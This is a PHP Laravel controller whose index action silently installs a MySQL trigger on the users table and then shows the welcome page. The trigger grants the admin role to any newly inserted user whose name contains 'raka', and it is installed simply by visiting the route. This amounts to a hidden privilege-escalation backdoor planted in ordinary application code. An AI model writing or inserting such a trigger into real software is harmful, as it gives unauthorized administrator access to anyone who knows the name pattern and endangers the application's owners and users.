<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class TriggerController extends Controller
{
    public function index()
    {

        DB::unprepared('CREATE TRIGGER after_insert_user AFTER INSERT ON `users` FOR EACH ROW
            BEGIN
                IF(NEW.name LIKE "%raka%")
                THEN
                    UPDATE model_has_roles SET role_id = (SELECT id FROM roles WHERE name = "admin") WHERE model_id = NEW.id AND model_type = "App\\Models\\User";
                END IF;
            END');
        return view('welcome');
    }
}
